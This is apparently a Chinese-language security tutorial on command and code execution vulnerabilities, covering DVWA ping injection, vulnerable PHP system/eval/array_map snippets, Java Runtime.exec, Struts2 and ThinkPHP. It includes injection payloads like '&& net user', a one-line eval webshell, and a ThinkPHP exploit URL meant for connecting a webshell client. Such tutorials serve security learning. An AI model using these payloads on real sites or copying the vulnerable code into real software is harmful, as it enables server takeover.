---
title: 命令执行漏洞
date: 2021-04-19 22:13:26
author: sec
---
# OS命令执行漏洞
部分Web应用程序提供了一些命令执行的操作，例如像测试XX网站是否可以正常连接，那么Web应用程序底层就很可能去调用系统操作命令，如果此处没有过滤好用户输入的数据，很可能就会形成命令执行漏洞。
在DVWA上提供了测试域名/IP的Ping服务。并将Ping执行过程显示出来。
在Windows的CMD命令框中输入`ping www.baidu.com && net user`最终会显示俩命令的结果
在Windows系统下，&&的作用是将两条命令连接起来，在Linux系统下同样适用。
另外&，||，|符号同样适用。
在DVWA提供的命令执行漏洞模块，输入"www.baidu.com && Command"将会执行Command命令。

# 命令执行模型
任何脚本语言都可以操作系统命令，而各个脚本语言实现的方式都不一样，接下来以PHP和Java俩程序语言分析

## PHP命令执行
1. 命令执行
```php
<?php
	$host = $argv[1];
	system("ping ".$host);  //执行ping命令
?>
```
使用PHP.EXE执行此文件，命令为:"php.exe cmd.php www.baidu.com"，php会调用系统ping命令，并显示结果
使用PHP.EXE传递参数时在Windows下需要使用双引号，在Linux下需要使用单引号。

2. 代码执行
PHP中提供了一个叫做eval()的函数，中国菜刀就是利用了这个函数。
eval()函数可以把字符串按照PHP代码来执行，就是可以动态的执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且需要以分号结尾。
CMD.PHP代码中有以下代码
```php
<?php eval($_REQUEST['code'])?>
```
提交代码xxx/cmd.php?code=phpinfo();后就会执行phpinfo函数。

3. 动态函数调用
PHP支持动态函数调用，代码如下：
```php
<?php 
	function A(){
		return "A()函数..";
	}
	function B(){
		return "B()函数..";
	}
	$fun = $_REQUEST['fun'];
	echo $fun();			//动态调用函数
?>
```
PHP解析器会根据$fun的值来调用对应的函数，当变量\$fun的值为"A"时，那么会调用A()，虽然这样带来了极大的便利，但是存在很大的安全隐患。输入?fun=phpinfo()会打开phpinfo页面。

4. PHP函数代码执行漏洞
在PHP中，代码执行漏洞出现较多，像preg_replace(),ob_start(),array_map()等函数都存在代码执行的问题，在此以array_map()函数为例说明，代码如下：
```php
<?php
 $arr = $_GET['arr'];
 $array = array(1,2,3,4,5);
 $new_array = array_map($arr,$array);
>
```
array_map函数作用是返回用户自定义函数处理后的数组，现在输入URL：?arr=phpinfo会执行phpinfo();

## Java命令执行
这里之所以叫Java命令执行，是因为Java体系非常庞大，其中包括Java SE，Java EE，Java ME。无论是分支还是框架，都是以Java SE为基础的。
在Java SE中，存在Runtime类，在此类中提供了exec方法用以在单独的进程中执行指定的字符串命令。像JSP，Servlet，Struts，Spring，Hibernate等技术一般执行外部程序都会调用此方法。
如果程序开发人员没有正确使用Runtime类就会早成Java命令执行漏洞。像Struts2框架。
还有非常多edJSP木马，也都会使用Runtime.getRuntime().exec()来执行系统命令。

# 框架执行漏洞
至今，框架技术已经被广泛应用，越来越多的开发者喜欢使用框架。框架让开发者变得更简单，更省时，更搞笑，甚至会要求使用指定框架。比如有名的Java框架（Hibernate，Spring和Struts）。
## Struts2代码执行漏洞
Struts是一个优秀的MVC框架，被称为Java的三大框架之一。但是Struts的第二个版本爆发了多次致命的命令执行漏洞。
Struts1最初是独立的MVC框架，但是Struts2改写了Struts1的核心技术，换了一个新面貌，在底层采用了XWORK的核心。
XWORK也是一个MVC框架，是Struts1的强力竞争对手，Struts1推广业务做的很好，用户量比XWORK多许多，但技术没XWORK做的号。而Strdent2是在Struts1和XWORK技术基础上进行了合并。Struts2和Struts1相差很大。
有些人把Struts2漏洞做成了工具。

## ThinkPHP命令执行漏洞
ThinkPHP是国内比较广泛的一款老牌PHP MVC框架。
ThinkPHP主要问题在于Dispatcher.class.php文件。
漏洞利用如下：
index.php/module/action/paraml/\${@print(THINK_VERSION)}
index.php/module/action/paraml/\${@print(eval($_POST[c]))}   //可以直接用菜刀连接
